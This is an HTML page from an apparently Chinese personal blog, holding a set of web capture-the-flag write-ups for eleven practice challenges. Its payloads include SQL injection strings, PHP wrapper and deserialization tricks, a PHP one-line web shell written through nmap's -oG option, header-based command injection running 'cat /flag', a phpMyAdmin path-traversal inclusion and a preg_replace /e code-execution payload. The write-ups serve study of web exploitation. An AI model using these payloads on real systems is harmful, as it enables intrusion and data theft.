@@ -1,0 +1,437 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CTF刷题记录(四) | z0ekball</title>
+<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1650036679524">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CTF刷题记录(四) | z0ekball - Atom Feed" href="https://z0ekball.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="[ZJCTF 2019]NiZhuanSiWei
+题目给出源码
+
+传入三个参数，需要三个参数都满足条件才能获得flag
+Text参数，需要满足(file_get_contents($text,'r')===&quot;welcome to ..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://z0ekball.github.io">
+  <img class="avatar" src="https://z0ekball.github.io/images/avatar.png?v=1650036679524" alt="">
+  </a>
+  <h1 class="site-title">
+    z0ekball
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CTF刷题记录(四)
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-02-27
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://z0ekball.github.io/tag/Wdr9TG9nw/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://z0ekball.github.io/post-images/ctf-shua-ti-ji-lu-si.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h2>
+<p>题目给出源码</p>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415220438186.png" alt="image-20220415220438186" loading="lazy"></figure>
+<p>传入三个参数，需要三个参数都满足条件才能获得flag</p>
+<p>Text参数，需要满足(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;</p>
+<p>意思为读取一个文件的内容与字符串进行强比较要相等，这里可以利用<code>伪协议data://</code>把该字符串写入一个文件，则可以绕过该比较</p>
+<pre><code>Playload:text=data://doc/;base64, d2VsY29tZSB0byB0aGUgempjdGY=
+</code></pre>
+<p>将“welcome to the zjctf”用base64编码写入再解码保存在doc文件中，成功绕过第一个强比较</p>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415220519705.png" alt="image-20220415220519705" loading="lazy"></figure>
+<p>File参数，正则判断时候含有flag字符，不含flag则可以包含该文件，执行指定文件。</p>
+<p>根据提示要读取useless.php文件，这里需要使用伪协议php://filter读取文件</p>
+<pre><code>Playload: file=php://filter/read=convert.base64-encode/resource=useless.php
+</code></pre>
+<p>得到文件内容的base64编码</p>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415220545076.png" alt="image-20220415220545076" loading="lazy"></figure>
+<p>解码得到一段代码</p>
+<pre><code class="language-php">&lt;?php 
+
+class Flag{ //flag.php 
+
+  public $file; 
+
+  public function __tostring(){ 
+
+​    if(isset($this-&gt;file)){ 
+
+​      echo file_get_contents($this-&gt;file); 
+
+​      echo &quot;&lt;br&gt;&quot;;
+
+​    return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } 
+
+?&gt; 
+</code></pre>
+<p>给出一个flag类，里面有file参数，结合password参数的反序列化漏洞，可以构造password来读取flag文件</p>
+<p>构造poc</p>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415220614294.png" alt="image-20220415220614294" loading="lazy"></figure>
+<p>得到</p>
+<pre><code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+</code></pre>
+<p>最终playload:</p>
+<pre><code>text=data://doc/;base64,%20d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+</code></pre>
+<p>页面显示</p>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415220641903.png" alt="image-20220415220641903" loading="lazy"></figure>
+<p>抓包发送得到flag</p>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415220647160.png" alt="image-20220415220647160" loading="lazy"></figure>
+<h2 id="suctf-2019checkin">[SUCTF 2019]CheckIn</h2>
+<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415223057971.png" alt="image-20220415223057971" loading="lazy"></figure>
+<p>文件上传题目，只允许上传图片</p>
+<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415223103541.png" alt="image-20220415223103541" loading="lazy"></figure>
+<p>利用<code>user.ini文件</code>形成后门原理就是会在执行所有的php文件之前包含.user.ini所指定的文件，抓包修改文件名，文件类型</p>
+<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415223118585.png" alt="image-20220415223118585" loading="lazy"></figure>
+<p>上传成功</p>
+<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415223143948.png" alt="image-20220415223143948" loading="lazy"></figure>
+<p>再制作一个简单图马</p>
+<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415223149368.png" alt="image-20220415223149368" loading="lazy"></figure>
+<p>上传成功</p>
+<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415223154470.png" alt="image-20220415223154470" loading="lazy"></figure>
+<p>访问该文件，已被解析成php格式</p>
+<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415223203729.png" alt="image-20220415223203729" loading="lazy"></figure>
+<p>蚁剑连接成功</p>
+<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415223209178.png" alt="image-20220415223209178" loading="lazy"></figure>
+<p>打开命令行，cat /flag获得flag</p>
+<h2 id="极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL</h2>
+<p>题目过滤了and、=、union等sql敏感字符，采用报错注入绕过这些字符</p>
+<pre><code>admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))#查库
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415223258200.png" alt="image-20220415223258200" loading="lazy"></figure>
+<pre><code>admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#查表
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415223302459.png" alt="image-20220415223302459" loading="lazy"></figure>
+<pre><code>admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#查列
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415223306454.png" alt="image-20220415223306454" loading="lazy"></figure>
+<pre><code>admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#查字段，只返回了flag的前半段
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415223310304.png" alt="image-20220415223310304" loading="lazy"></figure>
+<p>后面用left()right()语句查询拼接</p>
+<pre><code>admin'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415223315236.png" alt="image-20220415223315236" loading="lazy"></figure>
+<p>拼起来就是flag了</p>
+<h2 id="mrctf2020ez_bypass">[MRCTF2020]Ez_bypass</h2>
+<p>给出源码，要求上传参数绕过各个比较函数</p>
+<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415223339993.png" alt="image-20220415223339993" loading="lazy"></figure>
+<p>第一个<code>md5强比较</code>，由于md5无法处理数组，输入参数为数组时，md5函数返回false，当两个函数都是false时，强比较判断为相等。</p>
+<p>第二个<code>弱比较</code>，使用1234567a，1在前，php会将其整体转成数字，则能够绕过弱比较</p>
+<pre><code>Playload=id[]=1&amp;gg[]=1&amp;password=1234567a
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415223428275.png" alt="image-20220415223428275" loading="lazy"></figure>
+<h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h2>
+<p>简单的堆叠注入</p>
+<pre><code>1’;show databases;#查库
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415223444015.png" alt="image-20220415223444015" loading="lazy"></figure>
+<pre><code>1';show tables;#查表
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415223615185.png" alt="image-20220415223615185" loading="lazy"></figure>
+<pre><code>1';show columns from `FlagHere`;#查列
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415223621635.png" alt="image-20220415223621635" loading="lazy"></figure>
+<p>当输入select时，发现题目对select有严格过滤</p>
+<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415223627888.png" alt="image-20220415223627888" loading="lazy"></figure>
+<p>改用<code>handler</code>, handler … open语句打开一个表，使其可以使用后续handler… read语句访问，该表对象未被其他会话共享，并且在会话调用handler… close或会话终止之前不会关闭</p>
+<pre><code>1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
+</code></pre>
+<p>得到flag</p>
+<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415223636592.png" alt="image-20220415223636592" loading="lazy"></figure>
+<h2 id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool</h2>
+<p>题目给出源代码</p>
+<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415223725975.png" alt="image-20220415223725975" loading="lazy"></figure>
+<p><code>remote_addr</code>和<code>x_forwarded_for</code>函数用于服务器获取IP<br>
+<code>escapeshellarg()</code>和<code>escapeshellcmd()</code>一起使用时会引发解析漏洞<br>
+当传入127.0.0.1参数时<br>
+escapeshellarg处理后变成</p>
+<pre><code>'127.0.0.1'\'' -v -d a=1'
+</code></pre>
+<p>escapeshellcmd处理后变成</p>
+<pre><code>'127.0.0.1'\\'' -v -d a=1\'
+</code></pre>
+<p>最后结果是</p>
+<pre><code>curl '127.0.0.1'\\'' -v -d a=1\'，\\解析为\，‘’成为空白连接符，等价于curl 127.0.0.1\ -v -d a=1，即向127.0.0.1发起post请求，数据为a=1’
+</code></pre>
+<p>echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</p>
+<p>由于system执行命令且有host参数传参，可利用该参数传入shell</p>
+<p>由于nmap的-oG命令可以把结果写入指定文件中，所以可以通过写入一句话木马的方式获得shell</p>
+<pre><code>Playload= host=' &lt;?php @eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php '
+</code></pre>
+<p>上传的playload经两个函数处理后变成</p>
+<pre><code>''\\'' \&lt;\?php \@eval\(\$_POST\[\&quot;shell\&quot;\])\;\?\&gt; -oG test.php\'
+</code></pre>
+<p>上传playload之后获得文件地址</p>
+<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415224047717.png" alt="image-20220415224047717" loading="lazy"></figure>
+<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415224053607.png" alt="image-20220415224053607" loading="lazy"></figure>
+<p>蚁剑连接</p>
+<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415224059751.png" alt="image-20220415224059751" loading="lazy"></figure>
+<p>命令行获得flag</p>
+<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415224105531.png" alt="image-20220415224105531" loading="lazy"></figure>
+<h2 id="bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</h2>
+<p>题目有有flag.php，hint.php，index.php三个页面</p>
+<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415224128963.png" alt="image-20220415224128963" loading="lazy"></figure>
+<p><code>Flag.php</code>页面返回ip地址值</p>
+<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415224149959.png" alt="image-20220415224149959" loading="lazy"></figure>
+<p><code>Hint.php</code>页面给出提示，暗示ip可控</p>
+<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/image-20220415224155366.png" alt="image-20220415224155366" loading="lazy"></figure>
+<p>抓包分析flag.php页面，发现添加一个client-ip请求头可以控制返回的ip地址</p>
+<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415224202001.png" alt="image-20220415224202001" loading="lazy"></figure>
+<pre><code>client-ip:{3*3}
+</code></pre>
+<p>返回9，即可以执行语句</p>
+<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415224213408.png" alt="image-20220415224213408" loading="lazy"></figure>
+<pre><code>client-ip:{system(‘ls’)}
+</code></pre>
+<p>写入命令行，获取目录，发现flag.php文件</p>
+<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415224256954.png" alt="image-20220415224256954" loading="lazy"></figure>
+<pre><code>client-ip:{system('cat /flag')}
+</code></pre>
+<p>得到flag</p>
+<figure data-type="image" tabindex="38"><img src="https://z0ekball.github.io/post-images/image-20220415224321493.png" alt="image-20220415224321493" loading="lazy"></figure>
+<h2 id="gwctf-2019我有一个数据库">[GWCTF 2019]我有一个数据库</h2>
+<p>题目没给任何提示，根据题名应该猜测数据库名称，用御剑扫描出数据库为<code>PhpMyadmin</code></p>
+<figure data-type="image" tabindex="39"><img src="https://z0ekball.github.io/post-images/image-20220415224334182.png" alt="image-20220415224334182" loading="lazy"></figure>
+<p>不需秘钥，直接登录数据库，查看版本信息</p>
+<figure data-type="image" tabindex="40"><img src="https://z0ekball.github.io/post-images/image-20220415224349124.png" alt="image-20220415224349124" loading="lazy"></figure>
+<p>根据版本信息查询相关漏洞，发现phpmyadmin4.8.0-4.8.1存在<code>文件包含漏洞</code></p>
+<figure data-type="image" tabindex="41"><img src="https://z0ekball.github.io/post-images/image-20220415224404031.png" alt="image-20220415224404031" loading="lazy"></figure>
+<p>即直接构造</p>
+<pre><code>playload: target=db_datadict.php%253f/../../../../../../../../flag
+</code></pre>
+<p>直接读取flag</p>
+<figure data-type="image" tabindex="42"><img src="https://z0ekball.github.io/post-images/image-20220415224423267.png" alt="image-20220415224423267" loading="lazy"></figure>
+<h2 id="bjdctf2020zjctf不过如此">[BJDCTF2020]ZJCTF，不过如此</h2>
+<p>题目给出源码，和之前做的题有点相似</p>
+<figure data-type="image" tabindex="43"><img src="https://z0ekball.github.io/post-images/image-20220415224438611.png" alt="image-20220415224438611" loading="lazy"></figure>
+<p>第一个强比较使用<code>伪协议data://</code>绕过</p>
+<pre><code>Playload:text= data://doc/;base64, SSBoYXZlIGEgZHJlYW0=
+</code></pre>
+<p>成功绕过</p>
+<figure data-type="image" tabindex="44"><img src="https://z0ekball.github.io/post-images/image-20220415224508363.png" alt="image-20220415224508363" loading="lazy"></figure>
+<p>后面的文件包含使用<code>伪协议php://filter</code>读取next.php</p>
+<pre><code>Playload: file=php://filter/read=convert.base64-encode/resource=next.php
+</code></pre>
+<figure data-type="image" tabindex="45"><img src="https://z0ekball.github.io/post-images/image-20220415224530905.png" alt="image-20220415224530905" loading="lazy"></figure>
+<p>Base64解码，得到代码</p>
+<pre><code>&lt;?php
+
+$id = $_GET['id'];
+
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+
+  return preg_replace( '/(' . $re . ')/ei','strtolower(&quot;\\1&quot;)',$str);}
+
+foreach($_GET as $re =&gt; $str) {
+
+  echo complex($re, $str). &quot;\n&quot;;}
+
+function getFlag(){
+
+  @eval($_GET['cmd']);}
+</code></pre>
+<p>在next.php文件中get传入id参数和cmd参数</p>
+<p>preg_replace()以/e结尾时，存在<code>命令执行漏洞</code>，当存在/e则，匹配到符合正则表达式的字符串时，第二个参数的字符串将被当做代码执行</p>
+<p>第二参数为<code>strtolower(&quot;\\1&quot;)</code>等价于<code>strtolower(&quot;\1&quot;)</code>，<code>\1</code>在正则表达式中指定第一个匹配项，整个函数的意思就是取出正则表达式匹配后子匹配表达式的第一项</p>
+<p>foreach()函数把传进去的参数变为正则数值变为字符串</p>
+<p>getFlag()返回cmd参数执行内容</p>
+<p>构造</p>
+<pre><code>playload: \S*=${getFlag()}&amp;cmd=system('cat /flag');
+</code></pre>
+<p>上传得到flag</p>
+<figure data-type="image" tabindex="46"><img src="https://z0ekball.github.io/post-images/image-20220415224650366.png" alt="image-20220415224650366" loading="lazy"></figure>
+<h2 id="ciscn2019-华北赛区-day2-web1hack-world">[CISCN2019 华北赛区 Day2 Web1]Hack World</h2>
+<p>题目提示flag就在flag表flag列里</p>
+<figure data-type="image" tabindex="47"><img src="https://z0ekball.github.io/post-images/image-20220415224702830.png" alt="image-20220415224702830" loading="lazy"></figure>
+<p>Sql常规注入流程发现过滤了；、”、#、&amp;等字符，用（）绕过这些字符</p>
+<p>直接查询id=(select(flag)from(flag))只返回错误信息</p>
+<figure data-type="image" tabindex="48"><img src="https://z0ekball.github.io/post-images/image-20220415224721952.png" alt="image-20220415224721952" loading="lazy"></figure>
+<p>Id=sleep(3)延时一段时间再返回说明注入成功，但只返回错误提示</p>
+<p>猜测flag第一个字符为f即102，返回正确信息，所以是盲注</p>
+<figure data-type="image" tabindex="49"><img src="https://z0ekball.github.io/post-images/image-20220415224730283.png" alt="image-20220415224730283" loading="lazy"></figure>
+<p>脚本拿flag</p>
+<figure data-type="image" tabindex="50"><img src="https://z0ekball.github.io/post-images/image-20220415224749548.png" alt="image-20220415224749548" loading="lazy"></figure>
+<h2 id="swpu2019web1">[SWPU2019]Web1</h2>
+<p>随便注册一个账号，登录之后有广告申请</p>
+<figure data-type="image" tabindex="51"><img src="https://z0ekball.github.io/post-images/image-20220415224802040.png" alt="image-20220415224802040" loading="lazy"></figure>
+<p>输入’，查询却显示错误，存在注入点</p>
+<figure data-type="image" tabindex="52"><img src="https://z0ekball.github.io/post-images/image-20220415224831265.png" alt="image-20220415224814331" loading="lazy"></figure>
+<p>经验证过滤了空格，or，and，--+，#，order等敏感字符，用/**/代替空格,group by代替order by</p>
+<pre><code>-1'/**/group/**/by/**/21,'2，验证存在21个注入点
+
+0'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'5，回显2,3，说明回显点在2，3
+</code></pre>
+<figure data-type="image" tabindex="53"><img src="https://z0ekball.github.io/post-images/image-20220415224849366.png" alt="image-20220415224849366" loading="lazy"></figure>
+<pre><code>0'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'5查库
+</code></pre>
+<figure data-type="image" tabindex="54"><img src="https://z0ekball.github.io/post-images/image-20220415224932015.png" alt="image-20220415224932015" loading="lazy"></figure>
+<pre><code>0'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'5查表（information_schema.tables被过滤）
+</code></pre>
+<figure data-type="image" tabindex="55"><img src="https://z0ekball.github.io/post-images/image-20220415224940078.png" alt="image-20220415224940078" loading="lazy"></figure>
+<pre><code>0'union/**/select/**/1,(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)/**/as/**/b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'5,查列得到flag
+
+</code></pre>
+<figure data-type="image" tabindex="56"><img src="https://z0ekball.github.io/post-images/image-20220415224946140.png" alt="image-20220415224946140" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</a></li>
+<li><a href="#suctf-2019checkin">[SUCTF 2019]CheckIn</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019hardsql">[极客大挑战 2019]HardSQL</a></li>
+<li><a href="#mrctf2020ez_bypass">[MRCTF2020]Ez_bypass</a></li>
+<li><a href="#gyctf2020blacklist">[GYCTF2020]Blacklist</a></li>
+<li><a href="#buuctf-2018online-tool">[BUUCTF 2018]Online Tool</a></li>
+<li><a href="#bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</a></li>
+<li><a href="#gwctf-2019%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93">[GWCTF 2019]我有一个数据库</a></li>
+<li><a href="#bjdctf2020zjctf%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4">[BJDCTF2020]ZJCTF，不过如此</a></li>
+<li><a href="#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack-world">[CISCN2019 华北赛区 Day2 Web1]Hack World</a></li>
+<li><a href="#swpu2019web1">[SWPU2019]Web1</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-san/">
+              <h3 class="post-title">
+                CTF刷题记录(三)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://z0ekball.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
